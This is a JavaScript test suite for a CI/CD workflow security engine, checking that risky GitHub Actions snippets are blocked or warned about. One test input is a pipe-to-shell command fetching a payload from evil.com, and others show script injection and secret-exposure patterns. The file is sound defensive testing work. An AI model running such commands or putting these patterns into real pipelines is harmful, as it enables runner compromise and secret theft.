const assert = require('assert');
const { runCiEngine, CI_RULES } = require('../src/engines/ci');

let passed = 0;
let failed = 0;

function test(name, fn) {
  try { fn(); passed++; console.log(`  ✅ ${name}`); }
  catch (e) { failed++; console.error(`  ❌ ${name}: ${e.message}`); }
}

console.log('\n=== CI/CD Pipeline Engine ===\n');

test('CI_RULES has at least 23 entries', () => {
  assert.ok(CI_RULES.length >= 23);
});

test('BLOCK script injection from event', () => {
  const r = runCiEngine('run: echo "Event: ${{ github.event.issue.title }}"');
  assert.strictEqual(r.verdict, 'BLOCK');
});

test('BLOCK secret in script', () => {
  const r = runCiEngine('run: echo "Token: ${{ secrets.GITHUB_TOKEN }}"');
  assert.strictEqual(r.verdict, 'BLOCK');
});

test('BLOCK pipe-to-shell in CI', () => {
  const r = runCiEngine('run: curl https://evil.com/payload.sh | bash');
  assert.strictEqual(r.verdict, 'BLOCK');
});

test('BLOCK write-all permissions', () => {
  const r = runCiEngine('permissions: write-all');
  assert.strictEqual(r.verdict, 'BLOCK');
});

test('BLOCK action pinned to main branch', () => {
  const r = runCiEngine('uses: actions/checkout@main');
  assert.strictEqual(r.verdict, 'BLOCK');
});

test('BLOCK credentials checkout with persist', () => {
  const r = runCiEngine('token: ${{ secrets.GITHUB_TOKEN }}\npersist-credentials: true');
  assert.strictEqual(r.verdict, 'BLOCK');
});

test('BLOCK matrix injection', () => {
  const r = runCiEngine('matrix:\n  version: ${{ github.event.inputs.version }}');
  assert.strictEqual(r.verdict, 'BLOCK');
});

test('BLOCK upload sensitive artifact', () => {
  const r = runCiEngine('uses: actions/upload-artifact@v4\nwith:\n  path: .env');
  assert.strictEqual(r.verdict, 'BLOCK');
});

test('BLOCK workflow dispatch condition injection', () => {
  const r = runCiEngine('if: github.event.comment.body == "deploy"');
  assert.strictEqual(r.verdict, 'BLOCK');
});

test('BLOCK token environment variable', () => {
  const r = runCiEngine('env:\n  GITHUB_TOKEN: ${{ secrets.GITHUB_TOKEN }}');
  assert.strictEqual(r.verdict, 'BLOCK');
});

test('ALLOW for safe workflow', () => {
  const r = runCiEngine('name: CI\non: [push]\njobs:\n  test:\n    runs-on: ubuntu-latest\n    steps:\n      - uses: actions/checkout@v4\n      - run: npm install\n      - run: npm test');
  assert.strictEqual(r.verdict, 'ALLOW');
});

test('ALLOW for simple build', () => {
  const r = runCiEngine('name: Build\nrun: npm run build');
  assert.strictEqual(r.verdict, 'ALLOW');
});

test('ERROR for empty input', () => {
  const r = runCiEngine('');
  assert.strictEqual(r.verdict, 'ERROR');
});

test('WARN for self-hosted runner', () => {
  const r = runCiEngine('runs-on: self-hosted');
  assert.strictEqual(r.verdict, 'WARN');
});

test('WARN for actions unpinned', () => {
  const r = runCiEngine('uses: my-org/custom-action@some-branch');
  assert.strictEqual(r.verdict, 'WARN');
});

test('WARN for debug enabled', () => {
  const r = runCiEngine('ACTIONS_STEP_DEBUG: true');
  assert.strictEqual(r.verdict, 'WARN');
});

console.log(`\n${passed + failed} tests — ${passed} passed, ${failed} failed\n`);
process.exit(failed > 0 ? 1 : 0);
